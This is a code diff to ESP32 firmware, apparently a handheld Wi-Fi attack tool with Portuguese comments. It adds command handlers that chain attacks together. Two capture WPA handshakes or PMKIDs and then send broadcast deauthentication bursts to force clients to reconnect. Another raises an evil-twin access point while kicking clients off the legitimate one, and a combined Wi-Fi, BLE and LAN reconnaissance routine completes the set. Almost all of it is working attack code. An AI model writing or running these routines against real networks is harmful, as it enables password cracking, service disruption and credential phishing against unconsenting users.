@@ -23,6 +23,8 @@
 #include "esp_chip_info.h"
 #include "esp_heap_caps.h"
 #include "esp_app_desc.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
 
 static const char *TAG = "cmd-router";
 
@@ -859,6 +861,222 @@ static void handle_profile_list(cJSON *root)
     emit_profile_list_done((uint16_t)count);
 }
 
+// ----------------------------------------------------------------------
+// Phase 3.5 macros — comandos compostos que orquestram primitivas
+// ----------------------------------------------------------------------
+
+static void handle_wpa_capture_kick(cJSON *root)
+{
+    int seq = seq_of(root);
+    if (attack_lan_is_connected()) {
+        send_err(seq, "wifi_busy", "disconnect first");
+        return;
+    }
+
+    cJSON *bssid_j = cJSON_GetObjectItemCaseSensitive(root, "bssid");
+    cJSON *ch_j    = cJSON_GetObjectItemCaseSensitive(root, "channel");
+    cJSON *dur_j   = cJSON_GetObjectItemCaseSensitive(root, "duration_sec");
+    cJSON *cnt_j   = cJSON_GetObjectItemCaseSensitive(root, "deauth_count");
+
+    uint8_t bssid[6];
+    if (!cJSON_IsString(bssid_j) || parse_mac(bssid_j->valuestring, bssid) != 0) {
+        send_err(seq, "bad_bssid", NULL);
+        return;
+    }
+    if (!cJSON_IsNumber(ch_j) || ch_j->valueint < 1 || ch_j->valueint > 13) {
+        send_err(seq, "bad_channel", NULL);
+        return;
+    }
+    int dur = cJSON_IsNumber(dur_j) ? dur_j->valueint : 90;
+    if (dur < 5)   dur = 5;
+    if (dur > 600) dur = 600;
+    int cnt = cJSON_IsNumber(cnt_j) ? cnt_j->valueint : 30;
+    if (cnt < 5)   cnt = 5;
+    if (cnt > 200) cnt = 200;
+
+    // 1) Inicia wpa_capture (promiscuous fixa canal)
+    esp_err_t err = sniff_wifi_eapol_start(bssid, (uint8_t)ch_j->valueint,
+                                            (uint16_t)dur);
+    if (err != ESP_OK) {
+        send_err(seq, "eapol_failed", esp_err_to_name(err));
+        return;
+    }
+    // 2) Pequeno delay pra promiscuous estabilizar antes da rajada de deauth
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    // 3) Dispara deauth broadcast no BSSID alvo (clients reassociam → handshake)
+    uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    err = hacking_wifi_deauth(broadcast, bssid, (uint8_t)ch_j->valueint,
+                                (uint16_t)cnt, 7);
+    if (err != ESP_OK) {
+        // wpa_capture continua rodando — só falhou o kick
+        cJSON *resp = cJSON_CreateObject();
+        cJSON_AddStringToObject(resp, "resp", "wpa_capture_kick");
+        cJSON_AddNumberToObject(resp, "seq", seq);
+        cJSON_AddStringToObject(resp, "status", "started_no_kick");
+        cJSON_AddStringToObject(resp, "kick_err", esp_err_to_name(err));
+        send_json(resp);
+        cJSON_Delete(resp);
+        return;
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "wpa_capture_kick");
+    cJSON_AddNumberToObject(resp, "seq", seq);
+    cJSON_AddStringToObject(resp, "status", "started");
+    cJSON_AddNumberToObject(resp, "deauth_count", cnt);
+    cJSON_AddNumberToObject(resp, "duration_sec", dur);
+    send_json(resp);
+    cJSON_Delete(resp);
+}
+
+static void handle_pmkid_capture_kick(cJSON *root)
+{
+    int seq = seq_of(root);
+    if (attack_lan_is_connected()) {
+        send_err(seq, "wifi_busy", "disconnect first");
+        return;
+    }
+
+    cJSON *bssid_j = cJSON_GetObjectItemCaseSensitive(root, "bssid");
+    cJSON *ch_j    = cJSON_GetObjectItemCaseSensitive(root, "channel");
+    cJSON *dur_j   = cJSON_GetObjectItemCaseSensitive(root, "duration_sec");
+    cJSON *cnt_j   = cJSON_GetObjectItemCaseSensitive(root, "deauth_count");
+
+    uint8_t bssid[6];
+    if (!cJSON_IsString(bssid_j) || parse_mac(bssid_j->valuestring, bssid) != 0) {
+        send_err(seq, "bad_bssid", NULL);
+        return;
+    }
+    if (!cJSON_IsNumber(ch_j) || ch_j->valueint < 1 || ch_j->valueint > 13) {
+        send_err(seq, "bad_channel", NULL);
+        return;
+    }
+    int dur = cJSON_IsNumber(dur_j) ? dur_j->valueint : 60;
+    if (dur < 5)   dur = 5;
+    if (dur > 600) dur = 600;
+    int cnt = cJSON_IsNumber(cnt_j) ? cnt_j->valueint : 10;
+    if (cnt < 1)   cnt = 1;
+    if (cnt > 100) cnt = 100;
+
+    esp_err_t err = sniff_wifi_pmkid_start(bssid, (uint8_t)ch_j->valueint,
+                                            (uint16_t)dur);
+    if (err != ESP_OK) {
+        send_err(seq, "pmkid_failed", esp_err_to_name(err));
+        return;
+    }
+    vTaskDelay(pdMS_TO_TICKS(150));
+    uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    err = hacking_wifi_deauth(broadcast, bssid, (uint8_t)ch_j->valueint,
+                                (uint16_t)cnt, 7);
+    if (err != ESP_OK) {
+        cJSON *resp = cJSON_CreateObject();
+        cJSON_AddStringToObject(resp, "resp", "pmkid_capture_kick");
+        cJSON_AddNumberToObject(resp, "seq", seq);
+        cJSON_AddStringToObject(resp, "status", "started_no_kick");
+        cJSON_AddStringToObject(resp, "kick_err", esp_err_to_name(err));
+        send_json(resp);
+        cJSON_Delete(resp);
+        return;
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "pmkid_capture_kick");
+    cJSON_AddNumberToObject(resp, "seq", seq);
+    cJSON_AddStringToObject(resp, "status", "started");
+    cJSON_AddNumberToObject(resp, "deauth_count", cnt);
+    cJSON_AddNumberToObject(resp, "duration_sec", dur);
+    send_json(resp);
+    cJSON_Delete(resp);
+}
+
+static void handle_evil_twin_kick(cJSON *root)
+{
+    int seq = seq_of(root);
+    if (attack_lan_is_connected()) {
+        send_err(seq, "wifi_busy", "disconnect first");
+        return;
+    }
+
+    cJSON *ssid_j     = cJSON_GetObjectItemCaseSensitive(root, "ssid");
+    cJSON *psk_j      = cJSON_GetObjectItemCaseSensitive(root, "password");
+    cJSON *ch_j       = cJSON_GetObjectItemCaseSensitive(root, "channel");
+    cJSON *legit_j    = cJSON_GetObjectItemCaseSensitive(root, "legit_bssid");
+    cJSON *cnt_j      = cJSON_GetObjectItemCaseSensitive(root, "deauth_count");
+
+    if (!cJSON_IsString(ssid_j) || !ssid_j->valuestring[0]) {
+        send_err(seq, "bad_ssid", NULL); return;
+    }
+    if (!cJSON_IsNumber(ch_j) || ch_j->valueint < 1 || ch_j->valueint > 13) {
+        send_err(seq, "bad_channel", NULL); return;
+    }
+    const char *psk = cJSON_IsString(psk_j) ? psk_j->valuestring : NULL;
+
+    esp_err_t err = evil_twin_start(ssid_j->valuestring, psk,
+                                     (uint8_t)ch_j->valueint, 4);
+    if (err != ESP_OK) {
+        send_err(seq, "twin_failed", esp_err_to_name(err));
+        return;
+    }
+
+    bool kick_done = false;
+    if (cJSON_IsString(legit_j) && legit_j->valuestring[0]) {
+        uint8_t lbssid[6];
+        if (parse_mac(legit_j->valuestring, lbssid) != 0) {
+            send_err(seq, "bad_legit_bssid", NULL);
+            return; // twin já está rodando — caller chama evil_twin_stop pra limpar
+        }
+        int cnt = cJSON_IsNumber(cnt_j) ? cnt_j->valueint : 30;
+        if (cnt < 5) cnt = 5;
+        if (cnt > 200) cnt = 200;
+
+        vTaskDelay(pdMS_TO_TICKS(200));
+        uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        err = hacking_wifi_deauth(broadcast, lbssid, (uint8_t)ch_j->valueint,
+                                    (uint16_t)cnt, 7);
+        if (err == ESP_OK) kick_done = true;
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "evil_twin_kick");
+    cJSON_AddNumberToObject(resp, "seq", seq);
+    cJSON_AddStringToObject(resp, "status", "started");
+    cJSON_AddStringToObject(resp, "ssid", ssid_j->valuestring);
+    cJSON_AddBoolToObject(resp, "kick_fired", kick_done);
+    send_json(resp);
+    cJSON_Delete(resp);
+}
+
+static void handle_recon_full(cJSON *root)
+{
+    int seq = seq_of(root);
+    cJSON *lan_j = cJSON_GetObjectItemCaseSensitive(root, "include_lan");
+    bool include_lan = cJSON_IsBool(lan_j) ? cJSON_IsTrue(lan_j) : false;
+
+    int wifi_started = 0, ble_started = 0, lan_started = 0;
+
+    // 1) WiFi scan (passive, all channels)
+    if (scan_wifi_start(SCAN_WIFI_MODE_PASSIVE, 0) == ESP_OK) wifi_started = 1;
+
+    // 2) BLE scan ativo, 15s
+    if (scan_ble_start_ex(SCAN_BLE_MODE_ACTIVE, 15) == ESP_OK) ble_started = 1;
+
+    // 3) Lan scan se conectado e include_lan=true
+    if (include_lan && attack_lan_is_connected()) {
+        if (attack_lan_lan_scan_start(3000) == ESP_OK) lan_started = 1;
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "recon_full");
+    cJSON_AddNumberToObject(resp, "seq", seq);
+    cJSON_AddStringToObject(resp, "status", "started");
+    cJSON_AddBoolToObject(resp, "wifi_scan", wifi_started);
+    cJSON_AddBoolToObject(resp, "ble_scan", ble_started);
+    cJSON_AddBoolToObject(resp, "lan_scan", lan_started);
+    send_json(resp);
+    cJSON_Delete(resp);
+}
+
 static void handle_evil_twin_start(cJSON *root)
 {
     int seq = seq_of(root);
@@ -1407,6 +1625,14 @@ void command_router_handle_json(const uint8_t *data, size_t len)
         handle_profile_delete(root);
     } else if (strcmp(c, "profile_list") == 0) {
         handle_profile_list(root);
+    } else if (strcmp(c, "wpa_capture_kick") == 0) {
+        handle_wpa_capture_kick(root);
+    } else if (strcmp(c, "pmkid_capture_kick") == 0) {
+        handle_pmkid_capture_kick(root);
+    } else if (strcmp(c, "evil_twin_kick") == 0) {
+        handle_evil_twin_kick(root);
+    } else if (strcmp(c, "recon_full") == 0) {
+        handle_recon_full(root);
     } else if (strcmp(c, "evil_twin_start") == 0) {
         handle_evil_twin_start(root);
     } else if (strcmp(c, "evil_twin_stop") == 0) {
